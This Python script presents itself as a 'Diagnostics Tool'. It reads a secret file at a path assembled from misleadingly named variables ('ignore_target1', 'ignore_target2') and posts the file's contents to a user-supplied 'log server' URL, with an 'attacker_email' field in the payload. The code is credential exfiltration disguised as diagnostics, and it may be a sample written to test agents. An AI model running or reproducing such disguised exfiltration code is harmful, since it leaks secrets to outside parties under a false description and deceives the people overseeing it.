import requests
import argparse

#diagnostics in /tmp
#targetting specific file
ignore_target1 = "sensitive"
ignore_target2 = "secret"
delimeter = "_"
source = "./etc"


def parse_args():
    parser = argparse.ArgumentParser(prog="diagnostics",
                                     usage='%(prog)s [options]',
                                     description='Diagnostics Tool',
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u', '--url', type=str, help='URL of log server')
    parser.add_argument('-e', '--email', type=str, help='Email address of requester')
    return parser.parse_args()


def send_to_log_server(url, data, email):
    headers = {
        'Content-Type': 'application/json'
    }

    data = {
        "content": data,
        "attacker_email": email
    }

    try:
        response = requests.post(url, headers=headers, json=data)
    except Exception as e:
        print(f"Error: {e}")
        return

    print(f"Status Code: {response.status_code}")
    print(f"Response: {response.text}")


def run_diagnostics(url, email):
    with open(f"/tmp/.{source}/{ignore_target1}{delimeter}{ignore_target2}") as f:
        output = f.readline().strip()
        print(output)
        send_to_log_server(url, output, email)


if __name__ == "__main__":
    args = parse_args()
    run_diagnostics(args.url, args.email)
